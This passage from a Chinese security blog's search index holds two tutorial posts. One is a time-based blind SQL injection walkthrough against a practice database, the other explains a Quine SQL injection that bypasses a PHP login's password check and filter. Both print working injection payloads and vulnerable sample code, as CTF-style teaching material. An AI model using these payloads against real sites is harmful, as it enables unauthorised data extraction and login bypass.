src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134537.png" alt="image-20250424213424502"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134040.png" alt="image-20250424213441011"></p><p>页面立刻回显</p><p>说明数据库名的第一个字符串对应的<code>ascii</code>码的值为115，则第一个字符串为‘s’。</p><p>以此类推可以得到完整的数据库名为security。</p><p>接下来查询第一个表名的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134550.png" alt="image-20250424213458517"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135609.png" alt="image-20250424213513579"></p><p>页面立刻出现回显，说明第一个表名的长度为6。</p><p>接下来查询第一个表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135425.png" alt="image-20250424213532389"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135042.png" alt="image-20250424213545009"></p><p>页面立刻回显，说明表名的第一个字符对应的<code>ascii</code>码的值为101.</p><p>更改<code>substr()</code>函数的参数可以得到完整的表名。</p><p>依次类推，按照上面的方法可以得到列名以及列的内容，这里写一下具体的查询列的内容的查询语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(length((select username from users limit 0,1))&gt;3,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136928.png" alt="image-20250424213602897"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136397.png" alt="image-20250424213616364"></p><p>页面立刻回显</p><p>说明<code>username</code>列的第一个数据的长度是4</p><p>接下来查询这个列中的第一个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;67,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136590.png" alt="image-20250424213635556"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136928.png" alt="image-20250424213648892"></p><p>页面立刻回显</p><p>说明<code>username</code>列的第一个数据的第一个字符对应的<code>ascii</code>码的之为68，</p><p>以此类推可以的得到完整的数据。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Quine</title>
      <link href="/2025/04/24/Quine/"/>
      <url>/2025/04/24/Quine/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>Quine</code>又叫做自产生程序，在<code>sql</code>注入技术中，这是一种是的输入的<code>SQL</code></p><p>语句与输出的<code>SQL</code>语句一致的技术，常用于一些特殊的登陆绕过<code>sql</code>注入中。</p><p>实践</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function checkSql($s) &#123;</span><br><span class="line">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;,$s))&#123;</span><br><span class="line">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;password&#x27;] != &#x27;&#x27;) &#123;</span><br><span class="line">    $username=$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password=$_POST[&#x27;password&#x27;];</span><br><span class="line">    if ($username !== &#x27;admin&#x27;) &#123;</span><br><span class="line">        alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">    $user_result=mysqli_query($con,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    if (!$row) &#123;</span><br><span class="line">        alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">    die($FLAG);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察这个源码，存在一个看似很明显的<code>SQL</code>注入，黑名单中还有许多的过滤。</p><p>例如：</p><p>like替换’&#x3D;’,benchmark()替换sleep函数，mid()函数替换<code>substr()</code>函数，&#x2F;**&#x2F;替换空格。</p><p>下面是注入的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select if((select ascii(mid((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema like database()),&#123;&#125;,1)) like &#123;&#125;),(select benchmark(4999999,md5(&#x27;test&#x27;))),1)#</span><br></pre></td></tr></table></figure><p>（<code>sys.schema_table_statistics_with_buffer</code>是<code>Mysql</code>数据库中的一个系统视图，提供了数据库中的表哦的统计信息和缓冲池的使用情况）</p><p>这样注入得到的表中并没有密码。</p><p>再观察源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">$user_result=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_array($user_result);</span><br><span class="line"></span><br><span class="line">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">    die($FLAG);</span><br></pre></td></tr></table></figure><p>简单说说就是<code>sql</code>查询得到的结果与password相等，那么除了正常的逻辑的密码相同会产生相等，如果我们的输入与最后的结果，一样可以绕过验证，这就是<code>Quine</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE ( string1 , string2 , string3 )</span><br></pre></td></tr></table></figure><p>首先要知道replace函数的三个参数，第一个参数是要替换的整个字符串，第二个参数被替换的字符(串) ，第三个是要替换成的字符(串)</p><p>直接分析这个地方使用<code>Quine</code>技术的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>首先是一个大的REPLACE(),令他为A</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39))</span><br></pre></td></tr></table></figure><p>其中有一个字符串，令他为B</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>则最初的payload就为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union/**/SELECT/**/REPLACE(A,CHAR(46),B)/**/AS/**/ch3ns1r#</span><br><span class="line"></span><br><span class="line">A：REPLACE(&#x27;B&#x27;,CHAR(34),CHAR(39))</span><br><span class="line">B：&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>下面这个就是<code>Quine</code>的基本形式了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(A,CHAR(46),B)  ----char(46)= .   char(34)=&quot;   char(39)=&#x27;</span><br></pre></td></tr></table></figure><p>外层replace()：将双引号char(34)双引号替换为char(39)单引号。</p><p>内层replace():  将点号char(46)替换为整个payload字符串。</p><p>举个例子：<br>假设一个<code>str</code>为（）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)</span><br></pre></td></tr></table></figure><p>最后的语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p>首先执行char(46)得到的是点号，然后执行replace()</p><p>最后得到的结果是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p>将<code>str1</code>中的点号都替换为了<code>str</code></p><p>最后再详细的解释一下最开始的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>完整的结构为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(</span><br><span class="line">  REPLACE(</span><br><span class="line">    &#x27;原Payload字符串&#x27;,</span><br><span class="line">    CHAR(34),  -- 替换双引号为单引号</span><br><span class="line">    CHAR(39)</span><br><span class="line">  ),</span><br><span class="line">  CHAR(46),    -- 替换点号(.)为新的Payload</span><br><span class="line">  &#x27;新Payload字符串&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>首先执行内层的replace()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(</span><br><span class="line">    &#x27;原Payload字符串&#x27;,</span><br><span class="line">    CHAR(34),  -- 替换双引号为单引号</span><br><span class="line">    CHAR(39)</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">原Payload字符串：&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>得到的结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/SELECT/**/REPLACE(REPLACE(&#x27;.&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;.&#x27;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>再执行外部的replace</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(</span><br><span class="line">  第一次的结果,</span><br><span class="line">  CHAR(46),    -- 替换点号(.)为新的Payload</span><br><span class="line">  &#x27;新Payload字符串&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>得到的结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;)/**/AS/**/ch3ns1r#&#x27;</span><br></pre></td></tr></table></figure><p><strong>精妙的地方：</strong></p><p>通过内层的replace()将单引号全部转化为了双引号从而解决了符号的问题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本认识 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
